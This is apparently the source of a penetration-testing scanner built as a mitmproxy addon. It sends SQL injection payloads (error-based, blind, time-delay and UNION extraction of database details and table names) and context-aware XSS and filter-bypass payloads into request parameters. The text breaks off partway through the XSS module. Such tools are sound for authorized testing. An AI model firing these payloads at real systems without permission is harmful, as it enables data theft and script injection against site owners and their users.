#!/usr/bin/env python3
"""
Durpie v2 - Active Scanners (Phase 2)
======================================

Active security testing modules for authorized penetration testing.

Phase 2 implements:
    - ActiveSQLiScanner  : Error-based, boolean-blind, time-based, UNION-based SQLi
    - ActiveXSSScanner   : Context-aware XSS detection with PoC generation
    - SSRFExploiter      : Cloud metadata, internal port scanning, protocol smuggling

Usage as mitmproxy addons:
    mitmdump -s active_scanners.py

Standalone usage (scan a specific URL):
    import asyncio
    from active_scanners import ActiveSQLiScanner

    async def main():
        scanner = ActiveSQLiScanner()
        findings = await scanner.scan_url("https://target.com/search?q=test")
        for f in findings:
            print(f)

    asyncio.run(main())

WARNING: Only use against systems you own or have explicit written permission to test.
Unauthorized use is illegal and unethical.
"""

import re
import json
import time
import asyncio
import logging
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

import aiohttp

logger = logging.getLogger(__name__)

try:
    from mitmproxy import http, ctx
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False

    class _DummyHTTP:
        class HTTPFlow:
            pass

    http = _DummyHTTP()
    ctx = None


# ============================================================
# SHARED DATA STRUCTURES
# ============================================================

class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class Finding:
    """A security vulnerability finding."""
    type: str
    severity: str
    url: str
    detail: str
    evidence: str = ""
    parameter: str = ""
    payload: str = ""
    poc: str = ""
    db_type: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return {
            "type": self.type,
            "severity": self.severity,
            "url": self.url,
            "detail": self.detail,
            "evidence": self.evidence[:200] if self.evidence else "",
            "parameter": self.parameter,
            "payload": self.payload,
            "poc": self.poc,
            "db_type": self.db_type,
            "timestamp": self.timestamp,
        }

    def __str__(self) -> str:
        parts = [f"[{self.severity}] {self.type}"]
        if self.parameter:
            parts.append(f"param={self.parameter}")
        if self.payload:
            parts.append(f"payload={self.payload!r}")
        parts.append(f"url={self.url}")
        if self.detail:
            parts.append(self.detail)
        return " | ".join(parts)


@dataclass
class ProbeResult:
    """Result of a single HTTP probe request."""
    status_code: int
    body: str
    headers: Dict[str, str]
    elapsed: float  # seconds
    error: str = ""

    @property
    def length(self) -> int:
        return len(self.body)

    @property
    def timed_out(self) -> bool:
        return self.error == "timeout"

    @property
    def ok(self) -> bool:
        return self.error == "" and self.status_code != 0


# ============================================================
# ASYNC HTTP CLIENT
# ============================================================

class HTTPClient:
    """
    Lightweight async HTTP client for active scanning.

    Handles rate limiting, timeouts, and SSL verification skipping
    (needed when scanning targets behind HTTPS with self-signed certs).
    """

    DEFAULT_TIMEOUT = 15
    TIME_BASED_TIMEOUT = 30  # extended timeout for SLEEP() probes

    def __init__(self, timeout: int = DEFAULT_TIMEOUT, rate_limit: float = 0.0,
                 headers: Dict = None):
        """
        Args:
            timeout: Default request timeout in seconds.
            rate_limit: Minimum seconds between requests (0 = unlimited).
            headers: Default headers to send with every request (e.g. auth cookies).
        """
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.default_headers = headers or {}
        self._last_request_time = 0.0
        self._lock = asyncio.Lock()

    async def _throttle(self):
        """Enforce rate limiting between requests."""
        if self.rate_limit <= 0:
            return
        async with self._lock:
            elapsed = time.time() - self._last_request_time
            if elapsed < self.rate_limit:
                await asyncio.sleep(self.rate_limit - elapsed)
            self._last_request_time = time.time()

    async def request(self, method: str, url: str,
                      headers: Dict = None,
                      params: Dict = None,
                      data: Dict = None,
                      json_data: Dict = None,
                      timeout: int = None) -> ProbeResult:
        """Send an HTTP request and return a ProbeResult."""
        await self._throttle()

        merged_headers = {**self.default_headers, **(headers or {})}
        req_timeout = timeout or self.timeout

        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                start = time.time()
                async with session.request(
                    method, url,
                    headers=merged_headers,
                    params=params,
                    data=data,
                    json=json_data,
                    timeout=aiohttp.ClientTimeout(total=req_timeout),
                    allow_redirects=False,
                ) as resp:
                    body = await resp.text(errors="replace")
                    elapsed = time.time() - start
                    return ProbeResult(
                        status_code=resp.status,
                        body=body,
                        headers=dict(resp.headers),
                        elapsed=elapsed,
                    )
        except asyncio.TimeoutError:
            return ProbeResult(0, "", {}, req_timeout, error="timeout")
        except aiohttp.ClientError as e:
            return ProbeResult(0, "", {}, 0.0, error=f"client_error: {e}")
        except Exception as e:
            return ProbeResult(0, "", {}, 0.0, error=str(e))

    async def get(self, url: str, params: Dict = None, headers: Dict = None,
                  timeout: int = None) -> ProbeResult:
        return await self.request("GET", url, params=params, headers=headers, timeout=timeout)

    async def post(self, url: str, data: Dict = None, json_data: Dict = None,
                   headers: Dict = None, timeout: int = None) -> ProbeResult:
        return await self.request("POST", url, data=data, json_data=json_data,
                                  headers=headers, timeout=timeout)


# ============================================================
# UTILITIES
# ============================================================

def _extract_params(url: str, body: str = "", content_type: str = "") -> List[Tuple[str, str, str]]:
    """
    Extract all testable parameters from a URL and body.

    Returns list of (location, name, value) tuples.
    location is one of: "query", "form", "json", "cookie"
    """
    params = []

    # Query string parameters
    parsed = urllib.parse.urlparse(url)
    for name, value in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
        params.append(("query", name, value))

    # Form body parameters
    if body and "application/x-www-form-urlencoded" in content_type:
        for name, value in urllib.parse.parse_qsl(body, keep_blank_values=True):
            params.append(("form", name, value))

    # JSON body parameters (top-level string/number fields only)
    if body and "application/json" in content_type:
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                for name, value in obj.items():
                    if isinstance(value, (str, int, float)):
                        params.append(("json", name, str(value)))
        except json.JSONDecodeError:
            pass

    return params


def _inject_query_param(url: str, param_name: str, payload: str) -> str:
    """Replace a query parameter value with the given payload."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new_qs = [(k, payload if k == param_name else v) for k, v in qs]
    new_query = urllib.parse.urlencode(new_qs)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def _inject_form_param(body: str, param_name: str, payload: str) -> str:
    """Replace a form body parameter value with the given payload."""
    pairs = urllib.parse.parse_qsl(body, keep_blank_values=True)
    new_pairs = [(k, payload if k == param_name else v) for k, v in pairs]
    return urllib.parse.urlencode(new_pairs)


def _inject_json_param(body: str, param_name: str, payload: str) -> str:
    """Replace a JSON body parameter value with the given payload."""
    try:
        obj = json.loads(body)
        obj[param_name] = payload
        return json.dumps(obj)
    except (json.JSONDecodeError, KeyError):
        return body


# ============================================================
# ACTIVE SQL INJECTION SCANNER
# ============================================================

class ActiveSQLiScanner:
    """
    Active SQL Injection Scanner.

    Detection techniques:
        1. Error-based   : inject quoting characters and look for DB error messages
        2. Boolean-blind : compare response size for TRUE vs FALSE conditions
        3. Time-based    : measure response delay from SLEEP()/WAITFOR DELAY injections
        4. UNION-based   : enumerate column count and extract database information

    Database fingerprinting:
        Identifies MySQL, PostgreSQL, MSSQL, SQLite, Oracle from error messages
        and database-specific timing payloads.

    Why SQL injection matters:
        SQLi allows attackers to read, modify, or delete data from the database,
        bypass authentication, and in some cases execute OS commands.

    Usage:
        # Standalone
        scanner = ActiveSQLiScanner()
        findings = await scanner.scan_url("https://example.com/items?id=1")

        # As mitmproxy addon (add to addons list at bottom of file)
    """

    # Error-based payloads: cause the DB to produce an error message
    ERROR_PAYLOADS = [
        "'",
        "''",
        '"',
        "\\",
        "1'",
        "1\"",
        "1`",
        "' AND 1=CONVERT(int,(SELECT CHAR(58)+CHAR(58)))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ]

    # DB-specific error signatures
    DB_ERROR_SIGNATURES = {
        "mysql": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysql_",
            r"MySQL server version",
            r"check the manual that corresponds to your MySQL",
            r"MySqlException",
            r"com\.mysql\.jdbc",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"ERROR:.*syntax error at",
            r"pg_query\(\)",
            r"PSQLException",
            r"org\.postgresql",
        ],
        "mssql": [
            r"Microsoft.*ODBC.*SQL Server",
            r"Unclosed quotation mark",
            r"SQLSTATE\[",
            r"System\.Data\.SqlClient",
            r"mssql_query\(\)",
            r"OLE DB.*SQL Server",
        ],
        "oracle": [
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"quoted string not properly terminated",
        ],
        "sqlite": [
            r"SQLite\/JDBCDriver",
            r"SQLiteException",
            r"sqlite3\.OperationalError",
            r"near.*syntax error",
        ],
    }

    # Boolean-based blind payloads (TRUE/FALSE pairs)
    # The idea: same base condition, one evaluates to true, one to false.
    # If the two responses differ significantly, the parameter is injectable.
    BOOLEAN_PAYLOADS = [
        # (true_payload, false_payload)
        ("' AND '1'='1'--", "' AND '1'='2'--"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("' OR '1'='1'--", "' OR '1'='2'--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND 1=1--", "1' AND 1=2--"),
    ]

    # Time-based blind payloads per database type
    # TIME_DELAY must match TIME_THRESHOLD below
    TIME_DELAY = 5  # seconds to sleep
    TIME_THRESHOLD = 4.0  # minimum extra delay (seconds) vs baseline to flag

    TIME_PAYLOADS = {
        "mysql": [
            f"' AND SLEEP({TIME_DELAY})--",
            f"1' AND SLEEP({TIME_DELAY})--",
            f"'; SELECT SLEEP({TIME_DELAY});--",
        ],
        "postgresql": [
            f"'; SELECT pg_sleep({TIME_DELAY});--",
            f"' AND (SELECT 1 FROM pg_sleep({TIME_DELAY}))--",
        ],
        "mssql": [
            f"'; WAITFOR DELAY '0:0:{TIME_DELAY}';--",
            f"1'; WAITFOR DELAY '0:0:{TIME_DELAY}';--",
        ],
        "sqlite": [
            # SQLite has no sleep; use heavy computation as approximation
            f"' AND randomblob(100000000)--",
        ],
        "generic": [
            f"' AND SLEEP({TIME_DELAY})--",
            f"' OR SLEEP({TIME_DELAY})--",
            f"'; WAITFOR DELAY '0:0:{TIME_DELAY}';--",
            f"' AND (SELECT * FROM (SELECT SLEEP({TIME_DELAY}))a)--",
        ],
    }

    # UNION-based: used to extract data once column count is known
    # We substitute NULLs with string markers to find printable columns
    UNION_MARKER = "DURPIE_MARKER"

    def __init__(self, client: HTTPClient = None, max_params: int = 20):
        self.client = client or HTTPClient()
        self.max_params = max_params  # cap to avoid excessive requests
        self.findings: List[Finding] = []

    def _log(self, msg: str):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info(f"[SQLi] {msg}")
        else:
            logger.info(f"[SQLi] {msg}")

    def _warn(self, msg: str):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.warn(f"[SQLi] {msg}")
        else:
            logger.warning(f"[SQLi] {msg}")

    def _detect_db_from_error(self, body: str) -> str:
        """Identify database type from error message."""
        for db_type, patterns in self.DB_ERROR_SIGNATURES.items():
            for pat in patterns:
                if re.search(pat, body, re.IGNORECASE):
                    return db_type
        return "unknown"

    def _has_sql_error(self, body: str) -> Tuple[bool, str]:
        """
        Check if response body contains SQL error messages.
        Returns (found, matched_pattern).
        """
        all_patterns = [p for patterns in self.DB_ERROR_SIGNATURES.values() for p in patterns]
        for pat in all_patterns:
            match = re.search(pat, body, re.IGNORECASE)
            if match:
                return True, match.group(0)
        return False, ""

    async def _baseline(self, method: str, url: str, body: str,
                        content_type: str, req_headers: Dict) -> Optional[ProbeResult]:
        """Send baseline request to establish normal response metrics."""
        if method == "GET":
            return await self.client.get(url, headers=req_headers)
        else:
            if "json" in content_type:
                return await self.client.post(url, json_data=json.loads(body) if body else None,
                                              headers=req_headers)
            else:
                return await self.client.post(url, data=body or None, headers=req_headers)

    async def _probe(self, method: str, url: str, location: str, param: str,
                     payload: str, orig_body: str, content_type: str,
                     req_headers: Dict, timeout: int = None) -> Optional[ProbeResult]:
        """Send a probe request with the payload injected into the parameter."""
        if location == "query":
            injected_url = _inject_query_param(url, param, payload)
            if method == "GET":
                return await self.client.get(injected_url, headers=req_headers, timeout=timeout)
            else:
                return await self.client.post(injected_url, data=orig_body or None,
                                              headers=req_headers, timeout=timeout)
        elif location == "form":
            injected_body = _inject_form_param(orig_body, param, payload)
            return await self.client.post(url, data=injected_body, headers=req_headers,
                                          timeout=timeout)
        elif location == "json":
            injected_body = _inject_json_param(orig_body, param, payload)
            return await self.client.post(url, json_data=json.loads(injected_body),
                                          headers=req_headers, timeout=timeout)
        return None

    async def _test_error_based(self, method: str, url: str, location: str,
                                param: str, orig_body: str, content_type: str,
                                req_headers: Dict) -> Optional[Finding]:
        """
        Error-based SQLi detection.

        Injects payloads that trigger SQL syntax errors and looks for
        database error messages in the response.
        """
        for payload in self.ERROR_PAYLOADS:
            result = await self._probe(method, url, location, param, payload,
                                       orig_body, content_type, req_headers)
            if not result or not result.ok:
                continue

            found, evidence = self._has_sql_error(result.body)
            if found:
                db_type = self._detect_db_from_error(result.body)
                return Finding(
                    type="SQL Injection (Error-Based)",
                    severity=Severity.HIGH,
                    url=url,
                    detail=f"SQL error triggered in parameter '{param}' ({location}). "
                           f"Database appears to be: {db_type}",
                    evidence=evidence,
                    parameter=f"{location}:{param}",
                    payload=payload,
                    db_type=db_type,
                )
        return None

    async def _test_boolean_based(self, method: str, url: str, location: str,
                                  param: str, orig_body: str, content_type: str,
                                  req_headers: Dict) -> Optional[Finding]:
        """
        Boolean-based blind SQLi detection.

        Sends TRUE and FALSE condition payloads and compares response sizes.
        If there is a significant difference, the parameter is likely injectable.

        The technique works because:
        - TRUE condition (AND 1=1): query succeeds, normal response returned
        - FALSE condition (AND 1=2): query returns no rows, different response
        """
        baseline = await self._baseline(method, url, orig_body, content_type, req_headers)
        if not baseline or not baseline.ok:
            return None

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            true_result = await self._probe(method, url, location, param, true_payload,
                                            orig_body, content_type, req_headers)
            false_result = await self._probe(method, url, location, param, false_payload,
                                             orig_body, content_type, req_headers)

            if not true_result or not false_result:
                continue
            if not true_result.ok or not false_result.ok:
                continue

            # Compare response characteristics
            len_diff = abs(true_result.length - false_result.length)
            baseline_diff = abs(true_result.length - baseline.length)

            # Heuristic: TRUE response is similar to baseline, FALSE is different
            # AND the two payloaded responses differ substantially
            significant = len_diff > 50 and baseline_diff < len_diff
            status_diff = true_result.status_code != false_result.status_code

            if significant or status_diff:
                return Finding(
                    type="SQL Injection (Boolean-Based Blind)",
                    severity=Severity.HIGH,
                    url=url,
                    detail=f"Boolean-blind SQLi in parameter '{param}' ({location}). "
                           f"TRUE response: {true_result.length} bytes, "
                           f"FALSE response: {false_result.length} bytes "
                           f"(diff={len_diff})",
                    parameter=f"{location}:{param}",
                    payload=f"TRUE: {true_payload!r} | FALSE: {false_payload!r}",
                )
        return None

    async def _test_time_based(self, method: str, url: str, location: str,
                               param: str, orig_body: str, content_type: str,
                               req_headers: Dict) -> Optional[Finding]:
        """
        Time-based blind SQLi detection.

        Injects SLEEP()/WAITFOR DELAY payloads and measures whether the server
        takes significantly longer to respond. This works even when:
        - No error messages are shown
        - Boolean conditions don't change output

        The database executes the sleep function server-side, causing a measurable delay.
        """
        # Get baseline timing (average of 2 requests to reduce noise)
        times = []
        for _ in range(2):
            result = await self._baseline(method, url, orig_body, content_type, req_headers)
            if result and result.ok:
                times.append(result.elapsed)
        if not times:
            return None
        baseline_time = sum(times) / len(times)

        extended_timeout = int(self.TIME_DELAY * 2 + 10)

        # Try generic payloads first (most common DBs)
        all_payloads = (self.TIME_PAYLOADS["generic"] +
                        self.TIME_PAYLOADS["mysql"] +
                        self.TIME_PAYLOADS["postgresql"] +
                        self.TIME_PAYLOADS["mssql"])

        for payload in all_payloads:
            result = await self._probe(method, url, location, param, payload,
                                       orig_body, content_type, req_headers,
                                       timeout=extended_timeout)
            if not result:
                continue

            # A timed-out request or one that took TIME_DELAY+ seconds longer suggests a hit
            extra_delay = result.elapsed - baseline_time
            if result.timed_out or extra_delay >= self.TIME_THRESHOLD:
                db_hint = ""
                if "SLEEP" in payload:
                    db_hint = "MySQL/MariaDB"
                elif "pg_sleep" in payload:
                    db_hint = "PostgreSQL"
                elif "WAITFOR" in payload:
                    db_hint = "MSSQL"

                return Finding(
                    type="SQL Injection (Time-Based Blind)",
                    severity=Severity.HIGH,
                    url=url,
                    detail=f"Time-based blind SQLi in parameter '{param}' ({location}). "
                           f"Baseline: {baseline_time:.2f}s, "
                           f"With payload: {result.elapsed:.2f}s "
                           f"(+{extra_delay:.2f}s). "
                           f"Likely DB: {db_hint or 'unknown'}",
                    parameter=f"{location}:{param}",
                    payload=payload,
                    db_type=db_hint,
                )
        return None

    async def _enumerate_union_columns(self, method: str, url: str, location: str,
                                       param: str, orig_body: str, content_type: str,
                                       req_headers: Dict) -> Optional[int]:
        """
        Determine the number of columns in the UNION SELECT by incrementally
        adding NULLs until we stop getting an error.

        UNION SELECT works by appending a second query whose result set is
        added to the first. Both queries must have the same number of columns.
        """
        for col_count in range(1, 11):
            nulls = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {nulls}--"

            result = await self._probe(method, url, location, param, payload,
                                       orig_body, content_type, req_headers)
            if not result or not result.ok:
                continue

            has_error, _ = self._has_sql_error(result.body)
            if not has_error and result.status_code != 500:
                return col_count

        return None

    async def _test_union_based(self, method: str, url: str, location: str,
                                param: str, orig_body: str, content_type: str,
                                req_headers: Dict) -> Optional[Finding]:
        """
        UNION-based SQLi: enumerate column count and extract database metadata.

        Once we know the column count, we try to print database version/user
        into the response by substituting NULLs with marker strings or
        built-in functions like version(), user(), database().
        """
        col_count = await self._enumerate_union_columns(
            method, url, location, param, orig_body, content_type, req_headers
        )
        if col_count is None:
            return None

        self._log(f"UNION: found {col_count} columns for param '{param}'")

        # Extraction payloads per DB (try all, look for marker in response)
        extract_templates = [
            # MySQL
            "' UNION SELECT {cols}-- -",
            # Generic
            "' UNION ALL SELECT {cols}--",
        ]

        extraction_functions = [
            "version()",
            "user()",
            "database()",
            "@@version",
            "@@datadir",
            "sqlite_version()",
        ]

        marker = self.UNION_MARKER

        for tmpl in extract_templates:
            for func in extraction_functions:
                # Replace one NULL with the extraction function, rest stay NULL
                col_values = [func] + ["NULL"] * (col_count - 1)
                cols_str = ",".join(col_values)
                payload = tmpl.format(cols=cols_str)

                result = await self._probe(method, url, location, param, payload,
                                           orig_body, content_type, req_headers)
                if not result or not result.ok:
                    continue

                # Look for version-like strings in response
                version_patterns = [
                    r"\d+\.\d+\.\d+",       # generic version
                    r"MySQL|PostgreSQL|Microsoft SQL|SQLite|MariaDB",
                ]
                for vp in version_patterns:
                    m = re.search(vp, result.body, re.IGNORECASE)
                    if m:
                        return Finding(
                            type="SQL Injection (UNION-Based Data Extraction)",
                            severity=Severity.CRITICAL,
                            url=url,
                            detail=f"UNION-based SQLi confirmed in parameter '{param}' ({location}). "
                                   f"Extracted DB info from response. "
                                   f"Column count: {col_count}",
                            evidence=m.group(0),
                            parameter=f"{location}:{param}",
                            payload=payload,
                            poc=(
                                f"# Extract database version:\n"
                                f"# Inject into '{param}' parameter:\n{payload}\n\n"
                                f"# To extract table names (MySQL):\n"
                                f"' UNION SELECT table_name,NULL FROM "
                                f"information_schema.tables-- -"
                            ),
                        )

        # UNION confirmed (correct column count), even if extraction wasn't visible
        return Finding(
            type="SQL Injection (UNION-Based)",
            severity=Severity.HIGH,
            url=url,
            detail=f"UNION-based SQLi in parameter '{param}' ({location}). "
                   f"Column count: {col_count}. "
                   f"Data may not be reflected in response (try Blind extraction).",
            parameter=f"{location}:{param}",
            payload=f"' UNION SELECT {','.join(['NULL']*col_count)}--",
        )

    async def scan_url(self, url: str, method: str = "GET",
                       body: str = "", content_type: str = "",
                       headers: Dict = None) -> List[Finding]:
        """
        Scan a URL for SQL injection vulnerabilities.

        Args:
            url: Full URL (query params will be extracted and tested).
            method: HTTP method (GET or POST).
            body: Request body (for POST requests).
            content_type: Content-Type header value.
            headers: Additional request headers (e.g. session cookies).

        Returns:
            List of Finding objects describing detected vulnerabilities.
        """
        findings = []
        req_headers = headers or {}
        if content_type:
            req_headers = {**req_headers, "Content-Type": content_type}

        params = _extract_params(url, body, content_type)
        if not params:
            self._log(f"No injectable parameters found in {url}")
            return findings

        # Limit to avoid runaway scanning
        params = params[:self.max_params]
        self._log(f"Testing {len(params)} parameters in {url}")

        tested = set()
        for location, param, _value in params:
            key = f"{location}:{param}"
            if key in tested:
                continue
            tested.add(key)

            self._log(f"  Testing {location}:{param}")

            # 1. Error-based (fastest, try first)
            finding = await self._test_error_based(
                method, url, location, param, body, content_type, req_headers
            )
            if finding:
                findings.append(finding)
                self._warn(str(finding))
                continue  # Don't keep testing confirmed SQLi param

            # 2. Boolean-based blind
            finding = await self._test_boolean_based(
                method, url, location, param, body, content_type, req_headers
            )
            if finding:
                findings.append(finding)
                self._warn(str(finding))
                continue

            # 3. UNION-based
            finding = await self._test_union_based(
                method, url, location, param, body, content_type, req_headers
            )
            if finding:
                findings.append(finding)
                self._warn(str(finding))
                continue

            # 4. Time-based (slowest, try last)
            finding = await self._test_time_based(
                method, url, location, param, body, content_type, req_headers
            )
            if finding:
                findings.append(finding)
                self._warn(str(finding))

        return findings

    # ---- mitmproxy addon hooks ----

    def response(self, flow: 'http.HTTPFlow'):
        """Intercept responses and queue interesting endpoints for active SQLi testing."""
        if not flow.response:
            return

        # Only test in-scope endpoints with parameters
        url = flow.request.pretty_url
        body = flow.request.get_text()
        content_type = flow.request.headers.get("content-type", "")
        params = _extract_params(url, body, content_type)

        if not params:
            return

        # Schedule async scan without blocking the mitmproxy event loop
        req_headers = dict(flow.request.headers)
        asyncio.ensure_future(self._addon_scan(url, flow.request.method, body, content_type,
                                               req_headers))

    async def _addon_scan(self, url: str, method: str, body: str,
                          content_type: str, headers: Dict):
        findings = await self.scan_url(url, method, body, content_type, headers)
        for f in findings:
            self.findings.append(f)


# ============================================================
# ACTIVE XSS SCANNER
# ============================================================

class ActiveXSSScanner:
    """
    Active Cross-Site Scripting (XSS) Scanner.

    Why XSS matters:
        XSS lets attackers inject malicious scripts into pages viewed by other users.
        This enables session hijacking, credential theft, keylogging, and more.

    Context detection:
        The scanner detects WHERE the reflected value appears in the HTML:
        - HTML body context: between tags like <p>VALUE</p>
        - Attribute context: inside a tag attribute like <input value="VALUE">
        - Script context: inside <script>var x = "VALUE"</script>
        - URL context: inside href/src attributes

        Each context requires different payloads to break out and execute JS.

    Filter detection:
        Tests whether the application filters or encodes specific characters.
        Uses bypass techniques like case variation, HTML entities, Unicode encoding.

    Proof-of-concept:
        For confirmed vulnerabilities, generates a minimal HTML PoC page
        demonstrating the attack for your report.
    """

    # XSS probes by context
    # Each probe is (payload, expected_output_fragment)
    PROBE_BY_CONTEXT = {
        "html": [
            '<script>alert("DURPIE_XSS")</script>',
            '<img src=x onerror=alert("DURPIE_XSS")>',
            '<svg onload=alert("DURPIE_XSS")>',
            '<body onload=alert("DURPIE_XSS")>',
            '<details open ontoggle=alert("DURPIE_XSS")>',
        ],
        "attribute": [
            '" onmouseover="alert(\'DURPIE_XSS\')" x="',
            "' onmouseover='alert(\"DURPIE_XSS\")' x='",
            '" autofocus onfocus="alert(\'DURPIE_XSS\')" x="',
            '" style="x:expression(alert(\'DURPIE_XSS\'))"',  # IE legacy
        ],
        "script": [
            "';alert('DURPIE_XSS')//",
            '";alert("DURPIE_XSS")//',
            "\";alert`DURPIE_XSS`//",
            "'-alert('DURPIE_XSS')-'",
        ],
        "url": [
            "javascript:alert('DURPIE_XSS')",
            "data:text/html,<script>alert('DURPIE_XSS')</script>",
        ],
    }

    # Filter-bypass payloads (try when basic payloads are blocked/encoded)
    FILTER_BYPASS_PAYLOADS = [
        # Case variation
        "<ScRiPt>alert('DURPIE_XSS')</ScRiPt>",
        # Tag breaking
        "<scr<script>ipt>alert('DURPIE_XSS')</scr</script>ipt>",
        # SVG variations
        "<svg/onload=alert('DURPIE_XSS')>",
        "<svg\tonload=alert('DURPIE_XSS')>",
        # HTML entities inside event handlers
        "<img src=x onerror=alert&#40;'DURPIE_XSS'&#41;>",
        # JavaScript URI without alert
        "<a href='javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>click</a>",
        # Template literals (ES6)
        "<svg onload=alert`DURPIE_XSS`>",
        # Null bytes (some filters stop on null)
        "<scr\x00ipt>alert('DURPIE_XSS')</scr\x00ipt>",
    ]

    XSS_MARKER = "DURPIE_XSS"
    # Simple canary to detect basic reflection before trying real payloads
    REFLECTION_CANARY = "DURPIE_CANARY_X1Y2Z3"

    def __init__(self, client: HTTPClient = None):
        self.client = client or HTTPClient()
        self.findings: List[Finding] = []

    def _log(self, msg: str):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info(f"[XSS] {msg}")
        else:
            logger.info(f"[XSS] {msg}")

    def _warn(self, msg: str):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.warn(f"[XSS] {msg}")
        else:
            logger.warning(f"[XSS] {msg}")

    def _detect_context(self, body: str, value: str) -> List[str]:
        """
        Determine where a reflected value appears in the HTML document.

        Returns a list of context strings: "html", "attribute", "script", "url"
        """
        if not value or value not in body:
            return []

        contexts = []
        # Find all occurrences of value in body
        idx = 0
        while True:
            pos = body.find(value, idx)
            if pos == -1:
                break
            idx = pos + 1

            # Extract surrounding context (500 chars each side)
            before = body[max(0, pos - 500):pos]
            after = body[pos + len(value):pos + len(value) + 200]

            # Script context: inside <script> block
            if re.search(r"<script[^>]*>(?:[^<]|<(?!/script>))*$", before, re.IGNORECASE | re.DOTALL):
                if "script" not in contexts:
                    contexts.append("script")
                continue

            # URL context: inside href, src, action attributes
            url_attr = re.search(r'(?:href|src|action|data|formaction)\s*=\s*["\']?$',
                                  before, re.IGNORECASE)
            if url_attr:
                if "url" not in contexts:
                    contexts.append("url")
                continue

            # Attribute context: inside a tag but not in a URL attribute
            # Look for unclosed tag before the value
            last_open = before.rfind("<")
            last_close = before.rfind(">")
            if last_open > last_close:
                # We're inside an HTML tag
                if "attribute" not in contexts:
                    contexts.append("attribute")
                continue

            # Default: HTML body context
            if "html" not in contexts:
                contexts.append("html")

        return contexts

    def _is_encoded(self, body: str, payload: str) -> bool:
        """
        Check if the payload was HTML-encoded in the response.
        HTML-encoded output is NOT executable as XSS.
        """
        encoded_versions = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("<", "&#60;").replace(">", "&#62;"),
            payload.replace("\"", "&quot;").replace("'", "&#39;"),
        ]
        return any(enc in body for enc in encoded_versions)

    def _generate_poc(self, url: str, param: str, location: str, payload: str,
                      context: str) -> str:
        """Generate a minimal PoC HTML page for reporting."""
        safe_url = url.replace('"', "%22")
        return (
            f"<!-- Durpie XSS PoC -->\n"
            f"<!-- URL: {safe_url} -->\n"
            f"<!-- Parameter: {param} (location: {location}) -->\n"
            f"<!-- Context: {context} -->\n"
            f"<!-- Payload: {payload!r} -->\n\n"
            f"<html><body>\n"
            f"  <p>XSS PoC - click the link to trigger:</p>\n"
            f"  <a href=\"{safe_url}\">Trigger XSS</a>\n"
            f"</body></html>"
        )

    async def _probe(self, method: str, url: str, location: str, param: str,
                     payload: str, orig_body: str, content_type: str,
                     req_headers: Dict) -> Optional[ProbeResult]:
        """Send a probe request with the XSS payload."""
        if location == "query":
            injected_url = _inject_query_param(url, param, payload)
            if method == "GET":
                return await self.client.get(injected_url, headers=req_headers)
            return await self.client.post(injected_url, data=orig_body or None,
                                          headers=req_headers)
        elif location == "form":
            injected = _inject_form_param(orig_body, param, payload)
            return await self.client.post(url, data=injected, headers=req_headers)
        elif location == "json":
            injected = _inject_json_param(orig_body, param, payload)
            return await self.client.post(url, json_data=json.loads(injected),
                                          headers=req_headers)
        return None

    async def _test_reflection(self, method: str, url: str, location: str,
                               param: str, orig_body: str, content_type: str,
                               req_headers: Dict) -> Optional[Finding]:
        """
        Test for XSS reflection.

        Step 1: Send canary string to check if parameter is reflected at all.
        Step 2: Detect the reflection context (HTML/attribute/script/URL).
        Step 3: Choose payloads appropriate for that context.
        Step 4: Send XSS payloads and check if they appear unencoded.
        Step 5: Try filter bypass payloads if basic ones are filtered.
        """
        # Step 1: Canary test - is anything reflected?
        canary_result = await self._probe(method, url, location, param,
                                          self.REFLECTION_CANARY, orig_body,
                                          content_type, req_headers)
        if not canary_result or not canary_result.ok:
            return None
        if self.REFLECTION_CANARY not in canary_result.body:
            return None  # Not reflected at all

        # Step 2: Detect context
        contexts = self._detect_context(canary_result.body, self.REFLECTION_CANARY)
        if not contexts:
            contexts = ["html"]  # fallback

        self._log(f"Canary reflected in '{param}' ({location}), contexts: {contexts}")

        # Step 3 & 4: Try payloads for each context
        for context in contexts:
            payloads = self.PROBE_BY_CONTEXT.get(context, self.PROBE_BY_CONTEXT["html"])

            for payload in payloads:
                result = await self._probe(method, url, location, param, payload,
                                           orig_body, content_type, req_headers)
                if not result or not result.ok:
                    continue

                if self.XSS_MARKER in result.body and not self._is_encoded(result.body, payload):
                    poc = self._generate_poc(url, param, location, payload, context)
                    return Finding(
                        type=f"Reflected XSS ({context.title()} Context)",
                        severity=Severity.HIGH,
                        url=url,
                        detail=f"XSS payload reflected unencoded in parameter '{param}' "
                               f"({location}) in {context} context.",
                        evidence=payload,
                        parameter=f"{location}:{param}",
                        payload=payload,
                        poc=poc,
                    )

        # Step 5: Try filter bypass payloads
        for payload in self.FILTER_BYPASS_PAYLOADS:
            result = await self._probe(method, url, location, param, payload,
